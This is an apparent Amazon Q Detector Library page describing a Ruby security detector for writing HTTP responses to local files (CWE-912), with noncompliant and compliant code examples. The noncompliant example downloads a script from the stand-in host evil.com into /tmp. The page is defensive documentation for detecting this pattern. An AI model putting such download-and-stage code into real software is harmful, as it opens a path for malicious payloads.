![AWS logo](https://docs.aws.amazon.com/amazonq/detector-library/_next/static/media/aws-logo.506636a4.svg)

[Amazon QDetector Library](../../detector-library.md) [Sign in to Amazon Q](https://console.aws.amazon.com/amazonq/home)

#### Amazon Q

###### Detector Library

#### Ruby detectors(21/21)

[SQL Injection](sql-injection.md) [Divide by Zero](divide-by-zero.md) [Sensitive HTTP Action](sensitive-http-action.md) [Insufficient Protected Credentials](insufficiently-protected-credentials.md) [Sensitive Information Leak](sensitive-information-leak.md) [Untrusted Deserialization](untrusted-deserialization.md) [Log Injection](log-injection.md) [XML External Entity](xml-external-entity.md) [Path Injection](path-traversal.md) [Http to File Access](https://docs.aws.amazon.com/amazonq/detector-library/ruby/http-to-file-access) [Code Injection](https://docs.aws.amazon.com/amazonq/detector-library/ruby/code-injection) [OS Command Injection](https://docs.aws.amazon.com/amazonq/detector-library/ruby/os-command-injection) [Resource leak](https://docs.aws.amazon.com/amazonq/detector-library/ruby/resource-leak) [Cross Site Scripting (XSS)](https://docs.aws.amazon.com/amazonq/detector-library/ruby/cross-site-scripting) [Untrusted Open](https://docs.aws.amazon.com/amazonq/detector-library/ruby/untrusted-file-open) [Improper Input Validation](https://docs.aws.amazon.com/amazonq/detector-library/ruby/improper-input-validation) [Stack Trace Exposure](https://docs.aws.amazon.com/amazonq/detector-library/ruby/stack-trace-exposure) [Improper Certificate Validation](https://docs.aws.amazon.com/amazonq/detector-library/ruby/improper-certificate-validation) [send\_file Injection](https://docs.aws.amazon.com/amazonq/detector-library/ruby/sendfile-injection) [Unsafe File Permissions](https://docs.aws.amazon.com/amazonq/detector-library/ruby/loose-file-permissions) [Tainted Format](https://docs.aws.amazon.com/amazonq/detector-library/ruby/tainted-format)

# Http to File Access [High](https://docs.aws.amazon.com/amazonq/detector-library/ruby/severity/high)

Writing to a local file from http access may hide unintended functionality. This type of behavior may hide malicious code, and introduces a new vector for attacks.

**Detector ID**

ruby/http-to-file-access@v1.0

**Category**

[Security](https://docs.aws.amazon.com/amazonq/detector-library/ruby/categories/security)

**Common Weakness Enumeration (CWE)![external icon](https://docs.aws.amazon.com/amazonq/detector-library/_next/static/media/external.cdeb5c57.svg)**

[CWE-912](https://cwe.mitre.org/data/definitions/912.html)

**Tags**

-

* * *

#### Noncompliant example

```ruby
1def http_file_access_noncompliant
2  resp = Net::HTTP.new("evil.com").get("/script").body
3  file = File.open("/tmp/script", "w")
4  # Noncompliant: Writing a file from http access.
5  file.write(resp)
6end
```

#### Compliant example

```ruby
1def http_file_access_compliant
2  a = "a"
3  file = File.open("/tmp/script", "w")
4  # Compliant: Not using any http access to write in file.
5  file.write(a)
6end
```
